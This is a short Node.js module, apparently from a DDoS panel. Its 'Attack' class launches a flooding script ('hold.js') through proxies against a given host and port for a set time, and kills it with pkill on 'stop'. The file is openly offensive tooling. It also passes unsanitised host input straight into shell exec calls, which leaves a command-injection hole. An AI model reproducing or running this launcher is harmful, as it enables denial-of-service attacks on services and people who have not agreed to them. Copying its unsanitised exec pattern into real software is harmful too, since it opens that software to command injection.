const { all, get } = require("axios");
const {
    exec
} = require('child_process');
class Attack {
    static async send(host, port, time, method) {
        switch(method.toLowerCase()) {
            case "hold":
                all([
                    exec(`cd Method && node hold.js ${host} ${time} 32 10 proxy.txt`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "stop":
                all([
                    exec(`pkill ${host} -f`)
                ]);
                console.log(`Stoped Attack For ${host}`)
                break;
        }
    }
}

module.exports = Attack;